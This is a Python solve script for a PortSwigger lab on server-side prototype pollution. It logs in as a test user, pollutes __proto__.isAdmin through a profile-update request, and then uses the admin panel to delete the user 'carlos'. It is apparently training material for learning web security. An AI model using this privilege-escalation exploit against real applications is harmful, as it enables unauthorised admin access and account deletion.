"""
Lab 7: Privilege escalation via server-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
Difficulty: Practitioner

📝 A JSON body (the "update user profile" endpoint) is merged server-side
into the session/user object with no __proto__ guard. Pollute `isAdmin`
via the request body — every subsequent object created without that field
explicitly set (like the one checking our own privileges) inherits it.
"""

from utils import get_session, log, note, send_json_pollution

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}
UPDATE_PROFILE_PATH = "/my-account/update"  # confirm exact path from the account page


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Sending a profile-update request with __proto__.isAdmin polluted.")
    base_body = {"name": "wiener", "email": "wiener@normal-user.net"}
    r = send_json_pollution(s, f"{TARGET}{UPDATE_PROFILE_PATH}",
                             target_property="isAdmin", value=True,
                             base_object=base_body)
    log(f"Pollution request status: {r.status_code}")

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status after pollution: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")
    else:
        note("If this fails, the property name may differ ('admin' vs")
        note("'isAdmin') — check the app's privilege-check logic (visible")
        note("via any disclosed client-side JS) for the exact field name.")


if __name__ == "__main__":
    run()
